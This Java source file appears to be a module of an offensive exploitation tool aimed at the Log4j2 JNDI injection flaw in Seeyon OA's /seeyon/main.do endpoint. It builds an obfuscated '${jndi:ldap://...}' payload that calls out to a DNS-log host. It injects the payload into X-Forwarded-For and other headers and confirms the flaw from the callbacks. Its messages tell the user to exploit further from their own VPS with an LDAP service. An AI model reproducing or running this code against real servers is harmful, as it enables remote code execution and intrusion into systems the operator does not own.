package exp.oa.seeyonoa;

import core.Exploitlnterface;
import java.util.HashMap;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class seeyonoa_main_log4j2 implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(()->{
        textArea.appendText("\n log4j2无法getshell  请自行开启ladp服务利用");
        });
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        String log4jpayload = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + shell.getRandomString() + "." + shell.readFile(shell.dnspath).replace("http://","") + "}";
        HashMap<String,String> head = new HashMap();
        head.put("X-Forwarded-For", log4jpayload);
        head.put("X-Client-IP", log4jpayload);
        head.put("X-Requested-With", log4jpayload);
        head.put("X-Api-Version", log4jpayload);

        Response dns_le1 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        try {
            TimeUnit.SECONDS.sleep(3);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        if (Objects.isNull(dns_le1)|| Objects.isNull(dns_le1.getText())){
            // throw new RuntimeException("当前那EXP返回 null");
            Platform.runLater(()->{
                textArea.appendText("\n");
                textArea.appendText("seeyonoa_main_log4j2-RCE 当前那EXP返回 null");
            });
            return false;
        }
        int dns_1 = dns_le1.getText().length();

        Response response = HttpTools.get(url + "/seeyon/main.do", head, "utf-8");
        try {
          TimeUnit.SECONDS.sleep(5);
        } catch (InterruptedException e) {
          e.printStackTrace();
        }

        Response dns_le2 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        int dns_2 = dns_le2.getText().length();

        if(dns_2 > dns_1 && response.getCode() == 200){
            Platform.runLater(()->{
              textArea.appendText("\n log4j2漏洞存在-收到dnslog回显，请使用VPS自行利用");
            });
            return true;
        }else {
            Platform.runLater(()->{
              textArea.appendText("\n seeyonoa_main_log4j2-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }

    }
}
